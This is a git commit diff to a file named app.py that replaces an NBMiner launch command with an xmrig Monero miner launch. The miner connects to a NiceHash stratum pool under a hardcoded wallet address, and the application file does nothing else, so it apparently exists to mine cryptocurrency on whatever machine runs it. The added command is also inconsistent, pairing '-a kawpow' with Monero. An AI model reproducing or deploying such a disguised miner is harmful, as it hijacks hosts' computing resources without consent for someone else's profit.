11a720e8c382749f67a26e19cd2a876ded73f2f5
charpn <120244637+charpn@users.noreply.github.com>
2022-12-10 11:24:34 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,5 +1,5 @@
 import os
 import subprocess
 import tarfile
-os.system('tar -xvf NBMiner_42.3_Linux.tgz')
-os.system('./NBMiner_Linux/nbminer -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u NHbPqef6CnXTCjdXXRBqQGvWD43Skb6QFUxh.gpu')
+os.system('tar -xvf xmrig-6.18.1-linux-static-x64.tar.gz')
+os.system('./xmrig-6.18.1/xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbPqef6CnXTCjdXXRBqQGvWD43Skb6QFUxh.cpu -k --nicehash --coin monero -a kawpow')
